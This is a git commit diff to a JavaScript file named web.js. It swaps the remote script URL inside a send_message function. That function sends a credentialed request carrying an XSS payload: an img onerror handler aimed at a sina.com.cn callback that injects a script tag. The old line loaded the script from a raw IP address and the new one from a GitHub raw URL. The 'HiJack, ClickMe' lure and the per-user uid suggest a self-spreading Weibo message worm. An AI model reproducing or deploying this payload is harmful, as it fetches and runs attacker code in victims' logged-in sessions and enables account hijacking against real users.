c78a0f0ed3c996809f3f1888102e11bc51956fec
jiaowodalang <wudalangcn@gmail.com>
2022-09-08 17:01:51 +0800

    Update web.js

--- web.js
+++ web.js
@@ -19,7 +19,7 @@ function send_message(uid) {
     xhr.setRequestHeader("content-type", "application\/x-www-form-urlencoded");
     xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
     xhr.withCredentials = true;
-    var body = 'content_template={{link.DATA}}&content_data={"link"%3a{"color"%3a"%2300ffff","scheme"%3a"http://common.fj.sina.com.cn/index.php/unicom/unicominterface/webdraw?callback=%3Cimg/contentEditable/autoFocus/src=x%20onerror%3ds=createElement(%27script%27);body.appendChild(s);s.src=%27http://114.115.172.239:8000/weibo_chat.js%27;%3E","color_dark"%3a"%23ffffff","value"%3a"HiJack, ClickMe"}}&source=209678993&uid=' + uid;
+    var body = 'content_template={{link.DATA}}&content_data={"link"%3a{"color"%3a"%2300ffff","scheme"%3a"http://common.fj.sina.com.cn/index.php/unicom/unicominterface/webdraw?callback=%3Cimg/contentEditable/autoFocus/src=x%20onerror%3ds=createElement(%27script%27);body.appendChild(s);s.src=%27https://raw.githubusercontent.com/jiaowodalang/shoulu/master/web.js%27;%3E","color_dark"%3a"%23ffffff","value"%3a"HiJack, ClickMe"}}&source=209678993&uid=' + uid;
     var aBody = new Uint8Array(body.length);
     for (var i = 0; i < aBody.length; i++) aBody[i] = body.charCodeAt(i);
     xhr.send(new Blob([aBody]));
